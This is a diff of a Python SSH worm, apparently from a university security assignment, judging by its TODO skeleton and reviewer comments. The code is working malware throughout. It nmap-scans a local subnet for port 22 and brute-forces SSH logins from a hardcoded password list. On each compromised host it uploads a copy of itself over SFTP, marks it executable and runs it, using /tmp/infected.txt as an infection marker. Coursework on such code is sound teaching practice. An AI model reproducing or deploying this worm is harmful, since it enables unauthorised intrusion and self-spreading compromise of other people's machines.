@@ -2,6 +2,7 @@ import paramiko
 import sys
 import socket
 import nmap
+#import netinfo
 import os
 import sys
 import netifaces
@@ -13,7 +14,6 @@ credList = [
 ('hello1', 'world'),
 ('root', '#Gig#'),
 ('cpsc', 'cpsc'),
-('mike', '123')
 ]
 
 # The file marking whether the worm should spread
@@ -24,21 +24,21 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 def isInfectedSystem():
-	#MIG: Simplified this
-	return os.path.exists(INFECTED_MARKER_FILE)
 	# Check if the system as infected. One
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
-	# as infected). 
+	# as infected).
+	return os.path.exists("/tmp/infected.txt") 
 	#try:
 	#	print("checking for infected.txt")
-	#	f=open("/tmp/infected.txt")
+	#	f=open("/tmp/infected.txt", "r")
 	#	f.close()
+	#	return True
 	#except IOError:
 	#	print ("system not yet infected")
 	#	return False
-	#return True
+	
 
 #################################################################
 # Marks the system as infected
@@ -74,22 +74,16 @@ def spreadAndExecute(sshClient):
 		
 	# MIG: Create an instance of the SFTP client
 	sftpClient = sshClient.open_sftp()
-	print(sshClient)
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-	#MIG1: Changed the first argument to /tmp/replicator_worm.py. This is because
-	# by default the working directory on the remote system will be /home/cpsc
-	sftpClient.put("/tmp/replicator_worm.py","/tmp/"+"replicator_worm.py")
-	#MIG: change the permissions of the worm to be readable and writable by anybody
-	sftpClient.chmod("/tmp/replicator_worm.py", 777)
+	if len(sys.argv) < 2:
+		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
+	else:
+		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
-	#sshClient.exec_command("python /tmp/log.txt")
 	
-
-
-
-
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -101,7 +95,7 @@ def spreadAndExecute(sshClient):
 # return - 0 = success, 1 = probably wrong credentials, and
 # 3 = probably the server is down or is not running SSH
 ###########################################################
-def tryCredentials(inHost, userName, userPassword, sshClient):
+def tryCredentials(inHost, userName, password, sshClient):
 	
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -123,16 +117,13 @@ def tryCredentials(inHost, userName, userPassword, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-		
-	#MIG: Changed all instances of password to userPassword to prevent
-	# confusion with the "password" parameter of connect()
 	
-	print "Username: ", userName, "Password: ", userPassword
+	print "Username: ", userName, "Password: ", password
 	
 	try:
-		sshClient.connect(inHost, username = userName, password = userPassword)
-		print("Got him!", inHost,userName, userPassword)		
-
+		sshClient.connect(inHost, username = userName, password = password)
+		print("Got him!", inHost,userName, password)
+		return 0
 	# MIG: Removed this
 	#return 1 if wrong credentials
 	#except paramiko.AuthenticationException:
@@ -144,7 +135,7 @@ def tryCredentials(inHost, userName, userPassword, sshClient):
 	except socket.error:
 		print "This SSH server has issues or is not running..."
 		return 3
-	return 0
+	
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -153,7 +144,7 @@ def tryCredentials(inHost, userName, userPassword, sshClient):
 # credentials that work in a tuple (ssh, username, password).
 # If the attack failed, returns a NULL
 ###############################################################
-def attackSystem(host,Ip):
+def attackSystem(host):
 	
 	# The credential list
 	global credList
@@ -181,7 +172,7 @@ def attackSystem(host,Ip):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		print "Attacking "+ host+ "From "+ Ip
+		print "Attacking ", host
 		value = tryCredentials(host, username, password, ssh)
 		print "From the tryCredentials..."	
 		if value == 0:
@@ -205,10 +196,9 @@ def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	#MIG: Fixed this; you need to first specify a list of interfaces
-	interfaceList = netifaces.interfaces()
+	ipAddr = None
 	
-	for netFace in interfaceList:
+	for netFace in interface:
 		#Ip address of the interface
 		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
 
@@ -227,30 +217,27 @@ def getMyIP(interface):
 #######################################################
 def getHostsOnTheSameNetwork():
 	
-	# Create an instance of the port scanner class
+	# TODO: Add code for scanning
+	# for hosts on the same network
+	# and return the list of discovered
+	# IP addresses.	
+	
+	#create an instance of the port scanner
 	portScanner = nmap.PortScanner()
 	
-	# Scan the network for systems whose
-	# port 22 is open (that is, there is possibly
-	# SSH running there). 
+	#scan network for ssh port
 	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
-		
-	# Scan the network for hoss
-	hostInfo = portScanner.all_hosts()	
-	
-	# The list of hosts that are up.
+
+	#scan the network for host
+	hostInfo = portScanner.all_hosts()
+
+	#the list of host that are up.
 	liveHosts = []
-	
-	# Go trough all the hosts returned by nmap
-	# and remove all who are not up and running
-	for host in hostInfo:
 		
-		# Is ths host up?
+	for host in hostInfo:
+		#check for state of host
 		if portScanner[host].state() == "up":
 			liveHosts.append(host)
-	
-	
-		
 	return liveHosts
 
 # If we are being run without a command line parameters, 
@@ -278,39 +265,39 @@ if len(sys.argv) < 2:
 # TODO: Get the IP of the current system
 interface = netifaces.interfaces()
 
-systemIP = unicode(getMyIP(interface),"utf-8")
-print("System IP is " + systemIP )
+systemIP = getMyIP(interface)
+print("System IP is " + systemIP)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
-HostToAttck = []
-temp=[]
+print "getting list of network hosts................."
+print networkHosts
 
+# TODO: Remove the IP of the current system
+# from the list of discovered systems (we
+# do not want to target ourselves!
 
+attackList = []
+temp = []
 
-print "System in this network is : ",networkHosts
-
-for i,j in enumerate(networkHosts):
-	if networkHosts[i] != systemIP:
-		HostToAttck.append( networkHosts[i])
-	#Try to attack this host
-print "Found hosts: To attack", HostToAttck
-
+for targetHost,j in enumerate(networkHosts):
+	if networkHosts[targetHost] != systemIP:
+		attackList.append(networkHosts[targetHost])
+print "Found Hosts to attack: ", attackList
 
 # Go through the network hosts
-for host in HostToAttck:
-	systemIP = getMyIP(interface)
+for host in attackList:
 	
 	# Try to attack this host
-	sshInfo =  attackSystem(host,systemIP)
+	sshInfo =  attackSystem(host)
 	
 	print sshInfo
 	
-	temp1 = 0
+	
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread"
+		print "Trying to spread.............."
 		
 		# TODO: Check if the system was	
 		# already infected. This can be
@@ -348,7 +335,7 @@ for host in HostToAttck:
 		# To do that, you need an instance of the sftp client. 
 		# not SSH.
 		sftpClient = sshInfo[0].open_sftp()
-
+		
 		try:
 			# MIG: Check if the /tmp/infected.txt file
 			# already exists at the remote system.
@@ -357,12 +344,10 @@ for host in HostToAttck:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
-			print("We are going to spread ")
-			temp1=spreadAndExecute(sshInfo[0])
+			print("inside if isInfectedSytem() statement ")
+			spreadAndExecute(sshInfo[0])
+			print("done infecting")
+			exit()
 			
-			# MIG: If we just infected the system, we should
-			# exit.
-			exit(1)
-	if temp1==1:
-		exit(1)
+
 
